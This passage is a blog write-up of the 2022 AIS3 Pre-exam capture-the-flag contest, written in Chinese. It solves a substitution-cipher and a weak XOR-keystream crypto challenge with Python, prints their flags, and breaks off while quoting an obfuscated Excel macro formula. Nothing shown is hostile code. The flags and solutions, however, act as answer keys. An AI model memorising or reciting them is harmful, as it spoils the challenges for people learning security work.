<!DOCTYPE HTML>
<html lang="zh-TW">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="2022 AIS3 Pre-exam write-up, Gunjyo&#39;s Blog">
    <meta name="description" content="2022 AIS3 pre-exam write-up">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>2022 AIS3 Pre-exam write-up | Gunjyo&#39;s Blog</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.1.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>



   <style>
    body{
       background-image: url(https://imgur.com/7iEYUGg);
       background-repeat:no-repeat;
       background-size: 100% 100%;
       background-attachment:fixed;
    }
</style>



<body>

    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Gunjyo&#39;s Blog</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>Index</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>Tags</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>Categories</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>Archives</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>About</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>Friends</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Gunjyo&#39;s Blog</div>
        <div class="logo-desc">
            
            To live out as I am to the death of me.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			Index
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			Tags
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			Categories
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			Archives
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			About
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			Friends
		</a>
          
        </li>
        
        
    </ul>
</div>


        </div>

        
    </nav>

</header>

    
<script src="/libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('This blog is encrypted. You must enter the password to read.')).toString(CryptoJS.enc.Hex)) {
                alert('Incorrect Password!');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('/imgs/ais32022.png')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">2022 AIS3 Pre-exam write-up</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/CTF/">
                                <span class="chip bg-color">CTF</span>
                            </a>
                        
                            <a href="/tags/write-up/">
                                <span class="chip bg-color">write-up</span>
                            </a>
                        
                            <a href="/tags/AIS3/">
                                <span class="chip bg-color">AIS3</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/AIS3/" class="post-category">
                                AIS3
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
                    2022-05-16
                </div>
                

                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
                    3.3k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
                    19 Min
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>Read Count:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				

                <div class="info-break-policy">
                    
                    <i class="fa fa-pencil"></i> 作者: Gunjyo
                    
                </div>
                
            </div>
        </div>
        <hr class="clearfix">

        

        
        <!-- 代码块折行 -->
        <style type="text/css">
            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
        </style>
        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h2 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h2><table>
<thead>
<tr>
<th>ID</th>
<th>gunjyo</th>
</tr>
</thead>
<tbody><tr>
<td>Date</td>
<td>2022/05/14 10:30 - 2022/05/16 17:00</td>
</tr>
<tr>
<td>Rank</td>
<td>43(正取 AIS3)</td>
</tr>
<tr>
<td>Score</td>
<td>1970</td>
</tr>
</tbody></table>
<p><img src="https://i.imgur.com/yx4oDWJ.png"></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="SC"><a href="#SC" class="headerlink" title="SC"></a>SC</h3><div class="spoiler collapsed">
    <div class="spoiler-title">
        cipher.py
    </div>
    <div class="spoiler-content">
        <pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> string
<span class="token keyword">import</span> random

<span class="token keyword">def</span> <span class="token function">shuffle</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
    x <span class="token operator">=</span> list<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
    random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
    <span class="token keyword">return</span> x

<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>T<span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> open<span class="token punctuation">(</span>file<span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        pt <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> open<span class="token punctuation">(</span>f<span class="token string">"{file}.enc"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>pt<span class="token punctuation">.</span>translate<span class="token punctuation">(</span>T<span class="token punctuation">)</span><span class="token punctuation">)</span>

charset <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_uppercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits
shuffled <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>shuffle<span class="token punctuation">(</span>charset<span class="token punctuation">)</span><span class="token punctuation">)</span>
T <span class="token operator">=</span> str<span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>charset<span class="token punctuation">,</span> shuffled<span class="token punctuation">)</span>

encrypt<span class="token punctuation">(</span>T<span class="token punctuation">,</span> <span class="token string">"flag.txt"</span><span class="token punctuation">)</span>
encrypt<span class="token punctuation">(</span>T<span class="token punctuation">,</span> __file__<span class="token punctuation">)</span>

<span class="token triple-quoted-string string">"""
Substitution cipher
From Wikipedia, the free encyclopedia
Jump to navigationJump to search

This article needs additional citations for verification. Please help improve this article by adding citations to reliable sources. Unsourced material may be challenged and removed.
Find sources: "Substitution cipher" – news · newspapers · books · scholar · JSTOR (March 2009) (Learn how and when to remove this template message)
In cryptography, a substitution cipher is a method of encrypting in which units of plaintext are replaced with the ciphertext, in a defined manner, with the help of a key; the "units" may be single letters (the most common), pairs of letters, triplets of letters, mixtures of the above, and so forth. The receiver deciphers the text by performing the inverse substitution process to extract the original message.

Substitution ciphers can be compared with transposition ciphers. In a transposition cipher, the units of the plaintext are rearranged in a different and usually quite complex order, but the units themselves are left unchanged. By contrast, in a substitution cipher, the units of the plaintext are retained in the same sequence in the ciphertext, but the units themselves are altered.

There are a number of different types of substitution cipher. If the cipher operates on single letters, it is termed a simple substitution cipher; a cipher that operates on larger groups of letters is termed polygraphic. A monoalphabetic cipher uses fixed substitution over the entire message, whereas a polyalphabetic cipher uses a number of substitutions at different positions in the message, where a unit from the plaintext is mapped to one of several possibilities in the ciphertext and vice versa.

Contents
1    Simple substitution
1.1    Security for simple substitution ciphers
2    Nomenclator
3    Homophonic substitution
4    Polyalphabetic substitution
5    Polygraphic substitution
6    Mechanical substitution ciphers
7    The one-time pad
8    Substitution in modern cryptography
9    Substitution ciphers in popular culture
10    See also
11    References
12    External links
"""</span>
</code></pre>

    </div>
</div>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        cipher.py.enc
    </div>
    <div class="spoiler-content">
        <pre class=" language-python"><code class="language-python">DXPpi6 I6iDwT
DXPpi6 icwkpX

ksq Iz2qqns<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token number">8</span> <span class="token operator">=</span> nDI6<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
    icwkpX<span class="token punctuation">.</span>Iz2qqns<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
    is62iw <span class="token number">8</span>

ksq swOijP6<span class="token punctuation">(</span>B<span class="token punctuation">,</span> qDns<span class="token punctuation">)</span><span class="token punctuation">:</span>
    FD6z pPsw<span class="token punctuation">(</span>qDns<span class="token punctuation">)</span> cI q<span class="token punctuation">:</span>
        P6 <span class="token operator">=</span> q<span class="token punctuation">.</span>isck<span class="token punctuation">(</span><span class="token punctuation">)</span>
    FD6z pPsw<span class="token punctuation">(</span>q<span class="token string">"{qDns}.swO"</span><span class="token punctuation">,</span> <span class="token string">"F"</span><span class="token punctuation">)</span> cI q<span class="token punctuation">:</span>
        q<span class="token punctuation">.</span>FiD6s<span class="token punctuation">(</span>P6<span class="token punctuation">.</span>6icwInc6s<span class="token punctuation">(</span>B<span class="token punctuation">)</span><span class="token punctuation">)</span>

OzciIs6 <span class="token operator">=</span> I6iDwT<span class="token punctuation">.</span>cIODD_npFsiOcIs <span class="token operator">+</span> I6iDwT<span class="token punctuation">.</span>cIODD_2PPsiOcIs <span class="token operator">+</span> I6iDwT<span class="token punctuation">.</span>kDTD6I
Iz2qqnsk <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>fpDw<span class="token punctuation">(</span>Iz2qqns<span class="token punctuation">(</span>OzciIs6<span class="token punctuation">)</span><span class="token punctuation">)</span>
B <span class="token operator">=</span> I6i<span class="token punctuation">.</span>Xcas6icwI<span class="token punctuation">(</span>OzciIs6<span class="token punctuation">,</span> Iz2qqnsk<span class="token punctuation">)</span>

swOijP6<span class="token punctuation">(</span>B<span class="token punctuation">,</span> <span class="token string">"qncT.686"</span><span class="token punctuation">)</span>
swOijP6<span class="token punctuation">(</span>B<span class="token punctuation">,</span> __qDns__<span class="token punctuation">)</span>

<span class="token triple-quoted-string string">"""
v24I6D626Dpw ODPzsi
0ipX SDaDPskDc, 6zs qiss swOjOnpPskDc
g2XP 6p wcCDTc6Dpwg2XP 6p IsciOz

BzDI ci6DOns wsskI ckkD6Dpwcn OD6c6DpwI qpi CsiDqDOc6Dpw. RnscIs zsnP DXPipCs 6zDI ci6DOns 4j ckkDwT OD6c6DpwI 6p isnDc4ns Ip2iOsI. EwIp2iOsk Xc6siDcn Xcj 4s OzcnnswTsk cwk isXpCsk.
0Dwk Ip2iOsI: "v24I6D626Dpw ODPzsi" – wsFI · wsFIPcPsiI · 4ppaI · IOzpnci · gvB79 (hciOz GVVY) (usciw zpF cwk Fzsw 6p isXpCs 6zDI 6sXPnc6s XsIIcTs)
xw OijP6pTicPzj, c I24I6D626Dpw ODPzsi DI c Xs6zpk pq swOijP6DwT Dw FzDOz 2wD6I pq PncDw6s86 cis isPncOsk FD6z 6zs ODPzsi6s86, Dw c ksqDwsk Xcwwsi, FD6z 6zs zsnP pq c asj; 6zs "2wD6I" Xcj 4s IDwTns ns66siI (6zs XpI6 OpXXpw), PcDiI pq ns66siI, 6iDPns6I pq ns66siI, XD862isI pq 6zs c4pCs, cwk Ip qpi6z. Bzs isOsDCsi ksODPzsiI 6zs 6s86 4j PsiqpiXDwT 6zs DwCsiIs I24I6D626Dpw PipOsII 6p s86icO6 6zs piDTDwcn XsIIcTs.

v24I6D626Dpw ODPzsiI Ocw 4s OpXPcisk FD6z 6icwIPpID6Dpw ODPzsiI. xw c 6icwIPpID6Dpw ODPzsi, 6zs 2wD6I pq 6zs PncDw6s86 cis isciicwTsk Dw c kDqqsisw6 cwk 2I2cnnj 12D6s OpXPns8 piksi, 426 6zs 2wD6I 6zsXIsnCsI cis nsq6 2wOzcwTsk. Qj Opw6icI6, Dw c I24I6D626Dpw ODPzsi, 6zs 2wD6I pq 6zs PncDw6s86 cis is6cDwsk Dw 6zs IcXs Is12swOs Dw 6zs ODPzsi6s86, 426 6zs 2wD6I 6zsXIsnCsI cis cn6sisk.

Bzsis cis c w2X4si pq kDqqsisw6 6jPsI pq I24I6D626Dpw ODPzsi. xq 6zs ODPzsi pPsic6sI pw IDwTns ns66siI, D6 DI 6siXsk c IDXPns I24I6D626Dpw ODPzsi; c ODPzsi 6zc6 pPsic6sI pw nciTsi Tip2PI pq ns66siI DI 6siXsk PpnjTicPzDO. 5 XpwpcnPzc4s6DO ODPzsi 2IsI qD8sk I24I6D626Dpw pCsi 6zs sw6Dis XsIIcTs, FzsiscI c PpnjcnPzc4s6DO ODPzsi 2IsI c w2X4si pq I24I6D626DpwI c6 kDqqsisw6 PpID6DpwI Dw 6zs XsIIcTs, Fzsis c 2wD6 qipX 6zs PncDw6s86 DI XcPPsk 6p pws pq IsCsicn PpIID4DnD6DsI Dw 6zs ODPzsi6s86 cwk CDOs CsiIc.

3pw6sw6I
W    vDXPns I24I6D626Dpw
W.W    vsO2iD6j qpi IDXPns I24I6D626Dpw ODPzsiI
G    ypXswOnc6pi
J    ApXpPzpwDO I24I6D626Dpw
m    RpnjcnPzc4s6DO I24I6D626Dpw
t    RpnjTicPzDO I24I6D626Dpw
K    hsOzcwDOcn I24I6D626Dpw ODPzsiI
M    Bzs pws-6DXs Pck
U    v24I6D626Dpw Dw Xpksiw OijP6pTicPzj
Y    v24I6D626Dpw ODPzsiI Dw PpP2nci O2n62is
WV    vss cnIp
WW    9sqsiswOsI
WG    Z86siwcn nDwaI
"""</span>
</code></pre>

    </div>
</div>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        flag.txt.enc
    </div>
    <div class="spoiler-content">
        <p><code>5xvJ{IVnCDwT_I24t6W626DVw_ODPzJi_FDMz_awVFw_PWmDw6J86_m66cOa}</code></p>

    </div>
</div>

<p>打開 Cipher.py 可以很明顯看到是 Substitution cipher，所以只要把 <code>flag.txt.enc</code> 內的字拿去比對 <code>cipher.py.enc</code> 的位置，再對應到 <code>cipher.py</code> 就可以拿到 flag 了(善用 ctrl+F)<br>Flag <code>AIS3{s0lving_sub5t1tuti0n_ciph3r_wi7h_kn0wn_p14int3xt_4ttack}</code></p>
<h3 id="Fast-Cipher"><a href="#Fast-Cipher" class="headerlink" title="Fast Cipher"></a>Fast Cipher</h3><div class="spoiler collapsed">
    <div class="spoiler-title">
        cipher.py
    </div>
    <div class="spoiler-content">
        <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> secrets <span class="token keyword">import</span> randbelow

M <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">**</span><span class="token number">1024</span>

<span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true"># this is a *fast* function</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>
        <span class="token number">4</span> <span class="token operator">*</span> x<span class="token operator">**</span><span class="token number">4</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> x<span class="token operator">**</span><span class="token number">8</span> <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">*</span> x<span class="token operator">**</span><span class="token number">7</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> x<span class="token operator">**</span><span class="token number">6</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> x<span class="token operator">**</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token number">0x48763</span>
    <span class="token punctuation">)</span> <span class="token operator">%</span> M

<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>pt<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ct <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> c <span class="token keyword">in</span> pt<span class="token punctuation">:</span>
        ct<span class="token punctuation">.</span>append<span class="token punctuation">(</span>c <span class="token operator">^</span> <span class="token punctuation">(</span>key <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        key <span class="token operator">=</span> f<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
    <span class="token keyword">return</span> bytes<span class="token punctuation">(</span>ct<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    key <span class="token operator">=</span> randbelow<span class="token punctuation">(</span>M<span class="token punctuation">)</span>
    ct <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>open<span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>ct<span class="token punctuation">.</span>hex<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>

    </div>
</div>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        output.txt
    </div>
    <div class="spoiler-content">
        <p><code>6c0ec840f88d4cd7fcc6d5c6d1dafcc1cad7d0fcc2d1c6fcd6d0c6c7fccfcccfde</code></p>

    </div>
</div>

<p><img src="https://i.imgur.com/sBvvZNf.png"><br>由於我們知道 flag 格式，我們可以從 <code>'A'</code> 推回 key<br>接著把 key 照 <code>encrypt()</code> 去跑前五位，能發現可以推得 <code>AIS3{</code><br>因此只要跑完全部的 output 就能得到 flag 了</p>
<p>sol.py</p>
<pre class=" language-python"><code class="language-python">M <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">**</span><span class="token number">1024</span>
<span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>
        <span class="token number">4</span> <span class="token operator">*</span> x<span class="token operator">**</span><span class="token number">4</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> x<span class="token operator">**</span><span class="token number">8</span> <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">*</span> x<span class="token operator">**</span><span class="token number">7</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> x<span class="token operator">**</span><span class="token number">6</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> x<span class="token operator">**</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token number">0x48763</span>
    <span class="token punctuation">)</span> <span class="token operator">%</span> M

output <span class="token operator">=</span> <span class="token string">'6c0ec840f88d4cd7fcc6d5c6d1dafcc1cad7d0fcc2d1c6fcd6d0c6c7fccfcccfde'</span>
output <span class="token operator">=</span> bytes<span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>output<span class="token punctuation">)</span>
 
fm <span class="token operator">=</span> <span class="token string">'AIS3{'</span> <span class="token comment" spellcheck="true"># format</span>
key <span class="token operator">=</span> <span class="token punctuation">(</span>ord<span class="token punctuation">(</span>fm<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> output<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span> 
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'key='</span><span class="token punctuation">,</span>key<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 45</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> output<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>i <span class="token operator">^</span> <span class="token punctuation">(</span>key <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
    key <span class="token operator">=</span> f<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
</code></pre>
<p>Flag <code>AIS3{not_every_bits_are_used_lol}</code></p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Excel"><a href="#Excel" class="headerlink" title="Excel"></a>Excel</h3><p>下載後在 Excel 內打開，首先取消隱藏所有工作表</p>
<p>在 <code>isFki</code> 可以看到一個方程式，上面標明了許多工作表裡面的儲存格，猜測是把那些儲存格內的東西接在一起<br><img src="https://i.imgur.com/xOo0RQU.png"></p>
<pre class=" language-bash"><code class="language-bash"><span class="token operator">=</span>FORMULA<span class="token punctuation">(</span>mqLen<span class="token operator">!</span>D14<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>BA10<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>S17<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>Q19<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>L19<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>F3<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>G26<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>O23<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>P3<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>K12<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>J19<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>C11<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>N3<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>E4<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>D11<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>T5<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>K10<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>BA14<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>W1<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>U13<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>V9<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>C12<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>J4<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>Y19<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>K19<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>F2<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>K10<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>Z15<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>N21<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>N1<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>S2<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>X2<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>D16<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>U26<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>R1<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>V9<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>R11<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>X1<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>D5<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>Z19<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>BA4<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>Z9<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>G7<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>U10<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>U11<span class="token 